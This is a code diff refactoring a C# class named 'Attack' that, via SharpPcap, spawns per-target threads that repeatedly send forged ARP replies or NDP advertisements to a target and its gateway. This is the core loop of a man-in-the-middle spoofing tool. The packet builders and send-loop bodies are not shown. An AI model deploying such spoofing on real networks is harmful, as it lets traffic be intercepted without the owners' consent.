@@ -1,18 +1,17 @@
 ﻿using PacketDotNet;
 using SharpPcap;
-using System.Collections.Generic;
+using SharpPcap.LibPcap;
 using System.Net.Sockets;
-using System.Threading;
 
-class Attack
+class Attack_Class
 {
     //--Classes
-    private Arp arp;
-    private Ndp ndp;
+    private Arp_Class arp;
+    private Ndp_Class ndp;
 
     //--Variables
-    ILiveDevice liveDevice;
-    private List<Thread> threadList = new List<Thread>();
+    LibPcapLiveDevice liveDevice;
+    private readonly List<Thread> threadList = [];
 
     /// <summary>
     /// Indicates whether a Attack is active = true
@@ -24,7 +23,7 @@ class Attack
     /// </summary>
     /// <param name="pLiveDevice"></param>
     /// <param name="pTargetList"></param>
-    public void startAttack(ILiveDevice pLiveDevice, TargetList pTargetList)
+    public void StartAttack(LibPcapLiveDevice pLiveDevice, TargetList_Class pTargetList)
     {
         if (pLiveDevice != null)
         {
@@ -32,24 +31,24 @@ class Attack
             liveDevice = pLiveDevice;
 
             // ARP & NDP
-            arp = new Arp(pLiveDevice);
-            ndp = new Ndp(pLiveDevice);
+            arp = new Arp_Class();
+            ndp = new Ndp_Class(pLiveDevice);
 
             // Scan-Status
             scanStatus = true;
 
-            foreach (Target target in pTargetList.getTargetList())
+            foreach (Target_Class target in pTargetList.GetTargetList())
             {
                 if (target.t_ipAddr.AddressFamily.Equals(AddressFamily.InterNetwork))
                 {
-                    Thread thread = new Thread(() => arpThreadMethod(target));
+                    Thread thread = new(() => ArpThreadMethod(target));
                     thread.Start();
 
                     threadList.Add(thread);
                 }
                 else if (target.t_ipAddr.AddressFamily.Equals(AddressFamily.InterNetworkV6))
                 {
-                    Thread thread = new Thread(() => ndpThreadMethod(target));
+                    Thread thread = new(() => NdpThreadMethod(target));
                     thread.Start();
 
                     threadList.Add(thread);
@@ -62,11 +61,11 @@ class Attack
     /// 
     /// </summary>
     /// <param name="pTarget"></param>
-    private void arpThreadMethod(Target pTarget)
+    private void ArpThreadMethod(Target_Class pTarget)
     {
         //--Build Networkpacket
-        Packet arpRplPck_Target = arp.buildArpPacket(pTarget.t_ipAddr, pTarget.s_ipAddr, pTarget.t_phAddr);
-        Packet arpRplPck_Gateway = arp.buildArpPacket(pTarget.s_ipAddr, pTarget.t_ipAddr, pTarget.s_phAddr);
+        Packet arpRplPck_Target = Arp_Class.BuildArpPacket(pTarget.t_ipAddr, pTarget.s_ipAddr, pTarget.t_phAddr, liveDevice);
+        Packet arpRplPck_Gateway = Arp_Class.BuildArpPacket(pTarget.s_ipAddr, pTarget.t_ipAddr, pTarget.s_phAddr, liveDevice);
 
         while (scanStatus)
         {
@@ -80,11 +79,11 @@ class Attack
     /// 
     /// </summary>
     /// <param name="pTarget"></param>
-    private void ndpThreadMethod(Target pTarget)
+    private void NdpThreadMethod(Target_Class pTarget)
     {
         //--Build Networkpacket
-        Packet ndpAdvPck_Target = ndp.buildNdpPacket(pTarget.t_ipAddr, pTarget.s_ipAddr, pTarget.t_phAddr);
-        Packet ndpAdvPack_Gateway = ndp.buildNdpPacket(pTarget.s_ipAddr, pTarget.t_ipAddr, pTarget.s_phAddr);
+        Packet ndpAdvPck_Target = ndp.BuildNdpPacket(pTarget.t_ipAddr, pTarget.s_ipAddr, pTarget.t_phAddr);
+        Packet ndpAdvPack_Gateway = ndp.BuildNdpPacket(pTarget.s_ipAddr, pTarget.t_ipAddr, pTarget.s_phAddr);
 
         while (scanStatus)
         {
@@ -97,7 +96,7 @@ class Attack
     /// <summary>
     /// 
     /// </summary>
-    public void forceStop()
+    public void ForceStop()
     {
         scanStatus = false;
 
@@ -112,7 +111,7 @@ class Attack
     /// 
     /// </summary>
     /// <returns></returns>
-    public int getThreadCount()
+    public int GetThreadCount()
     {
         return threadList.Count;
     }
